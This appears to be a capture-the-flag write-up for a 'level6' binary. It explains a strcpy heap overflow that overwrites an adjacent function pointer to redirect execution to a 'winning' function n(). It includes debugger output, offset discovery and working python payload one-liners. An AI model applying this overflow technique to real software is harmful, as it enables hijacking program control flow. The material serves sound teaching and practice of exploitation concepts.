# Exploit Strcpy

From the man:
```
BUGS:
If the destination string of a strcpy() is not large enough, then anything might happen. 

Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.
Any time a program reads or copies data into a buffer, the program first needs to check that there's enough space.
```

## Context

We have 3 functions, main, n, and m.

Main function call twiche malloc.

```c
char *__dest = malloc(0x40); // 0x0804a1a0 is the buffer __dest;
strcpy(__dest, argv[1]);
```

Problem, strcpy loop until argv[1][x] = '\0' without checking for __dest size. Which is 0x40 max.

So the vulnerabilty is here.

The program call malloc a second time

```c
ppcVar1 = (code **)malloc(4); //0x0804a1f0 -> malloc de size 4
// later in the code, it point to m() func
```

As you can see in the stack :

```c
0x0804a1f0  →  0x08048468  →  <m+0> push ebp
0x0804a1a0  →  0x00000000
```
## Exploit

First : find offset of segfault: how many byte should i write in heap before overwriting:

```c
pattern create
r <pattern>
[#0] Id 1, Name: "level6", stopped 0x61616175 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset 0x61616175
[+] Searching for '75616161'/'61616175' with period=4
[+] Found at offset 80 (little-endian search) likely
```

if y write more than 80 char, it will overwrite next data in the heap. So lets overwrite function pointer to our vuln func.

```c
// run the program
gef➤ r $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 80 + b"B" * 4)')

// print memory mapping of process
gef➤ info  proc mappings 
process 20093
Mapped address spaces:

	Start Addr   End Addr       Size     Offset  Perms   objfile
	 0x8048000  0x8049000     0x1000        0x0  r-xp  
	 0x8049000  0x804a000     0x1000        0x0  rw-p   
	 0x804a000  0x806c000    0x22000        0x0  rw-p   [heap]
	 // heap start at 0x804a000

// printing 400 word(4byte) in hexa of the heap
gef➤  x/400xw 0x804a000
0x804a000:	0x00000000	0x00000000	0x00000000	0x00000191
...
0x804a190:	0x00000000	0x00000000	0x00000000	0x00000051
0x804a1a0:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a1b0:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a1c0:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a1d0:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a1e0:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a1f0:	0x42424242	0x00000000	0x00000000	0x00021e09
// bingo, we see that 0x804a1f0 as been overwrite
// remember, normaly it containt m() as we saw previsouly (0x0804a1f0  →  0x08048468  →  <m+0> push ebp)
```

It segfault because the program call `(**ppcVar1)();`. What it does ? It read the address store at 0x804a1f0 and jump to it.

Final step is too replace BBBB per the address of the winnig func : n();

```bash
objdump -t | grep n
08048454 g     F .text	00000014              n

./level6 $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 80 + b"\x54\x84\x04\x08")')
```

It doesn't work on the server, because the heap was store differently or the heap function isn't the same version. I cuted the offset and it worked fine.

```py
./level6 $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 72 + b"\x54\x84\x04\x08")')
```